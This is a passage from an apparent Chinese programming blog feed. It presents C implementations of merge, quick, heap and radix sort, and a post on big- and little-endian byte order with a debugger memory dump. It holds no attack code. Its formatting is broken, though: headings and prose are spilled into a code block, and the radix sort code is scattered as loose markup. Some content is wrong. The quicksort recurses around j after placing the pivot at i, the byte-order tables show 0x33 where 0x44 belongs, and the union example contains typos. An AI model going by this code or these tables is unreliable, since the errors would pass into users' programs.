&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">			temp[k++] = a[i++];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			temp[k++] = a[j++];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= m)</span><br><span class="line">		temp[k++] = a[i++];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (j &lt;= n)</span><br><span class="line">		temp[k++] = a[j++];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">		a[first + i] = temp[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergesort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> first, <span class="keyword">int</span> last, <span class="keyword">int</span> temp[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (first &lt; last)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = (first + last) / <span class="number">2</span>;</span><br><span class="line">		mergesort(a, first, mid, temp);    <span class="comment">//左边有序</span></span><br><span class="line">		mergesort(a, mid + <span class="number">1</span>, last, temp); <span class="comment">//右边有序</span></span><br><span class="line">		mergearray(a, first, mid, last, temp); <span class="comment">//再将二个有序数列合并</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	mergesort(a, <span class="number">0</span>, n - <span class="number">1</span>, p);</span><br><span class="line">	<span class="keyword">delete</span>[] p;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="快速排序">快速排序</h2><p>快速排序算法通常情况下明显比同为<em><code>Ο(nlogn)</code></em>复杂度的其它算法快，因此使用较多。排序中使用了分治法思想。</p>
<p>stes:</p>
<blockquote>
<ol>
<li>确定基数，即从队列中挑选出一个元素</li>
<li>以基数为基准将队列一分为二，即将小于基数的元素放在队列左侧，而大于基数的元素放在队列右侧</li>
<li>在对基数的左右两个队列分别进行上述操作，直至各区间只剩下一个元素为止</li>
</ol>
</blockquote>
<p>动态演示：<br><img src="http://wuchong.me/img/Quicksort-example.gif" alt=""></p>
<p>c代码：<br><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">void QuickSort(int <span class="keyword">input</span>[], int <span class="keyword">begin</span>, int <span class="keyword">end</span>)</span><br><span class="line"><span class="keyword">&#123;</span></span><br><span class="line">	int i,j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">begin</span> <span class="keyword">&gt;</span><span class="keyword">=</span> <span class="keyword">end</span>)</span><br><span class="line">	<span class="keyword">&#123;</span></span><br><span class="line">		return;</span><br><span class="line">	<span class="keyword">&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//key = input[end];</span></span><br><span class="line">	<span class="comment">//Swap(&amp;input[k],&amp;input[end]);</span></span><br><span class="line">	</span><br><span class="line">	i <span class="keyword">=</span> <span class="keyword">begin</span><span class="keyword">-</span><span class="number">1</span>;</span><br><span class="line">	j <span class="keyword">=</span> <span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">&#123;</span></span><br><span class="line">		do </span><br><span class="line">		<span class="keyword">&#123;</span></span><br><span class="line">			i<span class="keyword">+</span><span class="keyword">+</span>;</span><br><span class="line">		<span class="keyword">&#125;</span> <span class="keyword">while</span> (<span class="keyword">input</span>[i]<span class="keyword">&gt;</span><span class="keyword">input</span>[<span class="keyword">end</span>]);</span><br><span class="line"></span><br><span class="line">		do </span><br><span class="line">		<span class="keyword">&#123;</span></span><br><span class="line">			j<span class="keyword">-</span><span class="keyword">-</span>;</span><br><span class="line">		<span class="keyword">&#125;</span> <span class="keyword">while</span> (<span class="keyword">input</span>[j]<span class="keyword">&lt;</span><span class="keyword">input</span>[<span class="keyword">end</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (i<span class="keyword">&lt;</span>j)</span><br><span class="line">		<span class="keyword">&#123;</span></span><br><span class="line">			Swap(<span class="keyword">&amp;</span><span class="keyword">input</span>[i],<span class="keyword">&amp;</span><span class="keyword">input</span>[j]);</span><br><span class="line">		<span class="keyword">&#125;</span><span class="keyword">else</span><span class="keyword">&#123;</span></span><br><span class="line">			break;</span><br><span class="line">		<span class="keyword">&#125;</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">&#125;</span></span><br><span class="line"></span><br><span class="line">	Swap(<span class="keyword">&amp;</span><span class="keyword">input</span>[<span class="keyword">end</span>], <span class="keyword">&amp;</span><span class="keyword">input</span>[i]);</span><br><span class="line">	QuickSort(<span class="keyword">input</span>,<span class="keyword">begin</span>,j<span class="keyword">-</span><span class="number">1</span>);</span><br><span class="line">	QuickSort(<span class="keyword">input</span>,j<span class="keyword">+</span><span class="number">1</span>,<span class="keyword">end</span>);</span><br><span class="line"><span class="keyword">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="堆排序">堆排序</h2><p>堆排序中使用了<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%8F%89%E5%A0%86" target="_blank" rel="external">二叉堆</a>的概念</p>
<p>二叉堆通常通过一维数组表示，若起始数组为0，节点的访问：</p>
<ul>
<li>父节点<code>i</code>的左子节点位置<code>2*i+1</code></li>
<li>父节点<code>i</code>的右子节点位置<code>2*i+2</code></li>
<li>子节点<code>i</code>的父节点位置<code>floor((i-1)/2)</code></li>
</ul>
<p>steps:</p>
<blockquote>
<ol>
<li>根据序列创建最大二叉堆</li>
<li>移除最大二叉堆的根节点（即最大值），重新调整最大二叉堆</li>
</ol>
</blockquote>
<p>动态演示：</p>
<p><img src="http://wuchong.me/img/Heapsort-example.gif" alt=""></p>
<p>c代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shift</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> ind,<span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> tmp;</span><br><span class="line">	<span class="keyword">int</span> i = ind;</span><br><span class="line">	<span class="keyword">int</span> c = i*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (c &lt; n)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (c+<span class="number">1</span>&lt;n &amp;&amp; a[c] &lt; a[c+<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			c++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (a[i]&gt;a[c]) </span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			tmp = a[c];</span><br><span class="line">			a[c] = a[i];</span><br><span class="line">			a[i] = tmp;</span><br><span class="line"></span><br><span class="line">			i = c;</span><br><span class="line">			c = <span class="number">2</span>*i+<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_sort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,tmp;</span><br><span class="line">	<span class="comment">/*初始化堆*/</span></span><br><span class="line">	<span class="keyword">for</span>(i=(n-<span class="number">2</span>)/<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">		shift(a,i,n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/*将堆的根节点保存*/</span></span><br><span class="line">		tmp = a[<span class="number">0</span>];</span><br><span class="line">		a[<span class="number">0</span>] = a[n-i-<span class="number">1</span>];</span><br><span class="line">		a[n-i-<span class="number">1</span>] = tmp;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**/</span></span><br><span class="line">		shift(a,<span class="number">0</span>,n-i-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">```   </span><br><span class="line">   </span><br><span class="line"><span class="preprocessor">## 基数排序</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">基数排序是一种**非比较型**的整数排序算法。</span><br><span class="line"></span><br><span class="line">[基数排序演示](http:<span class="comment">//www.cs.usfca.edu/~galles/visualization/RadixSort.html)</span></span><br><span class="line"></span><br><span class="line">原理：</span><br><span class="line">&gt; 将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</span><br><span class="line"></span><br><span class="line">steps：</span><br><span class="line">&gt; <span class="number">1.</span> 将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。</span><br><span class="line"><span class="number">2.</span> 从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后，数列就变成一个有序序列。</span><br><span class="line"></span><br><span class="line">(上述时从最右边开始的，称为LSD，Least significant digital，若从最左边开始称为MSD，Most significant digital)</span><br><span class="line"></span><br><span class="line">复杂度：</span><br><span class="line">&gt;基数排序的时间复杂度是O(k·n)，其中n是排序元素个数，k是数字位数。注意这不是说这个时间复杂度一定优于O(n·<span class="built_in">log</span>(n))，k的大小取决于数字位的选择（比如比特位数），和待排序数据所属数据类型的全集的大小；k决定了进行多少轮处理，而n是每轮处理的操作数目。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c代码：</span><br></pre></td></tr></table></figure>
<p>#define MAX 30</p>
<p>#define BASE 10</p>
<p>void radixsort(int array[],int n)<br>{<br>    int i,b[MAX],exp = 1;<br>    int m = array[0];</p>
<pre><code><span class="comment">/*找出最大数*/</span>
<span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)
{
    <span class="keyword">if</span> (<span class="built_in">array</span>[i]&gt;m)
    {
        m = <span class="built_in">array</span>[i];
    }
}

<span class="keyword">while</span>(m/<span class="built_in">exp</span> &gt;<span class="number">0</span>)
{
    <span class="keyword">int</span> bucket[BASE] = {<span class="number">0</span>};

    <span class="comment">/*按位入桶*/</span>
    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++){
        bucket[(<span class="built_in">array</span>[i]/<span class="built_in">exp</span>)%BASE]++;
    }

    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;BASE;i++){
        bucket[i] += bucket[i-<span class="number">1</span>];
    }

    <span class="comment">/*根据每位进行一次排序*/</span>
    <span class="keyword">for</span> (i=n-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--){
        b[--bucket[(<span class="built_in">array</span>[i]/<span class="built_in">exp</span>)%BASE]] = <span class="built_in">array</span>[i];
    }

    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++){
        <span class="built_in">array</span>[i] = b[i];
    }

    <span class="built_in">exp</span> *= BASE;
}
</code></pre><p>}</p>
<p>```</p>
<h2 id="排序算法的比较">排序算法的比较</h2><p>平均而言，对于一般的<strong>随机序列顺序表</strong>而言，上述几种排序算法性能从低到高的顺序大致为：</p>
<blockquote>
<p>冒泡排序 &lt; 插入排序 &lt; 选择排序 &lt; 希尔排序 &lt; 快速排序</p>
</blockquote>
<p>但这个优劣顺序不是绝对的，在不同的情况下，甚至可能出现完全的性能逆转。</p>
<p>对于序列初始状态<strong>基本有正序</strong>，可选择对有序性较敏感的如:</p>
<blockquote>
<p>插入排序、冒泡排序、选择排序等方法</p>
</blockquote>
<p>对于序列<strong>长度比较大的随机序列</strong>，应选择平均时间复杂度较小的<strong>快速排序</strong>方法。</p>
<ul>
<li>影响排序效果的因素：</li>
</ul>
<blockquote>
<ol>
<li>待排序的记录数目n</li>
<li>记录的大小（规模）</li>
<li>关键字的结构及其初始状态</li>
<li>对稳定性的要求</li>
<li>语言工具的条件</li>
<li>存储结构</li>
<li>时间和辅助空间复杂度等</li>
</ol>
</blockquote>
<p>各种排序算法复杂度即稳定性比较</p>
<p><img src="http://blog.chinaunix.net/attachment/201201/18/21457204_1326898064RUxx.jpg" alt=""></p>
<h2 id="参考：">参考：</h2><ul>
<li><a href="http://www.webhek.com/misc/comparison-sort" target="_blank" rel="external">排序算法可视化</a></li>
<li><a href="http://student.zjzk.cn/course_ware/data_structure/web/paixu/paixu8.1.1.1.htm" target="_blank" rel="external">排序或分类</a></li>
<li><a href="http://wuchong.me/blog/2014/02/09/algorithm-sort-summary/" target="_blank" rel="external">经典排序算法实现与总结</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95" target="_blank" rel="external">wiki上的排序算法</a></li>
<li><a href="http://www.cnblogs.com/zhaoshuai1215/p/3448154.html" target="_blank" rel="external">各种排序算法总结和比较</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这里以从小到大排序为例</p>
</blockquote>
<h2 id="冒泡排序">冒泡排序</h2><p>steps：</p>
<blockquote>
<ol>
<li>比较相邻的元素，将较大的交换到右边</li>
<li>从0~n-1重复]]>
    </summary>
    
      <category term="数据结构" scheme="http://m0nkee.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[字节序]]></title>
    <link href="http://m0nkee.github.io/2015/08/14/byte-count/"/>
    <id>http://m0nkee.github.io/2015/08/14/byte-count/</id>
    <published>2015-08-14T15:41:39.000Z</published>
    <updated>2015-08-16T09:13:55.753Z</updated>
    <content type="html"><![CDATA[<blockquote>
<ul>
<li>大端字节序   </li>
<li>小端字节序   </li>
</ul>
</blockquote>
<p>值<code>int a = 0x11223344</code>存储方式</p>
<ul>
<li>大端字节序   </li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">内容</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">低地址</td>
<td style="text-align:center">0x11  a[0]</td>
</tr>
<tr>
<td style="text-align:center">高地址</td>
<td style="text-align:center">0x33  a[3]</td>
</tr>
</tbody>
</table>
<ul>
<li>小端字节序   </li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">内容</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">低地址</td>
<td style="text-align:center">0x33  a[3]</td>
</tr>
<tr>
<td style="text-align:center">高地址</td>
<td style="text-align:center">0x11 a[0]</td>
</tr>
</tbody>
</table>
<blockquote>
<p> 此处的a[0]仅表示a的高位即0x11其他依次类推</p>
</blockquote>
<ul>
<li>调试   </li>
</ul>
<p>定义两个变量：   </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> m1 = <span class="number">0x11223344</span>;   </span><br><span class="line"><span class="keyword">int</span> m2 = <span class="number">0x55667788</span>;   </span><br><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">0x12</span>,<span class="number">0x34</span>,<span class="number">0x56</span>,<span class="number">0x78</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>单步调试进去查看内存情况：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0018FF10  <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span>  烫烫烫烫烫烫烫   </span><br><span class="line">0018FF1E  <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> <span class="keyword">CC</span> 12 00 00 00 34 00 00 00  烫烫烫....4...   </span><br><span class="line">0018FF2C  56 00 00 00 78 00 00 00 88 77 66 55 44 33  V...x...坵fUD3   </span><br><span class="line">0018FF3A  22 11 78 FF 18 00 4E 91 44 00 FF FF FF FF  ".x...<span class="keyword">N</span>慏.....</span><br><span class="line">0018FF48  88 FF 18 00 B9 30 42 00 01 00 00 00 48 13  .....0B.....<span class="keyword">H</span>.</span><br></pre></td></tr></table></figure></p>
<p>由上述内存情况分析可得：</p>
<blockquote>
<ul>
<li>变量的存储是从高地址 –&gt; 低地址，即m2的地址 &lt; m1的地址</li>
<li>该系统是小端存储的，如m1的高位0x11存放在高地址处</li>
<li><strong>注意</strong>数组的存放是从a[0]放在低地址处</li>
</ul>
</blockquote>
<p>所以,如果有如下共同体：   </p>
<pre><code><span class="keyword">union</span> test {
    <span class="keyword">int</span> i;
    <span class="keyword">char</span> a[<span class="number">4</span>];
}

<span class="keyword">union</span> test t;
t.i = <span class="number">0x11223344</span>；
print(<span class="string">"%x\n"</span>,t.a[<span class="number">3</span>]);  
}
</code></pre><p>当运行的系统是小端字节序时，此时的a[3]的值就为0x11了。   </p>
<p><i class="icon-linux icon-2x"></i>   </p>
<hr>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<ul>
<li>大端字节序   </li>
<li>小端字节序   </li>
</ul>
</blockquote>
<p>值<code>int a = 0x11223344</code>存储方式</p>
<ul>
<li>大端字节序   </li>]]>
    </summary>
    
      <category term="c/c++" scheme="http://m0nkee.github.io/tags/c-c/"/>
    
  </entry>
  
</feed>
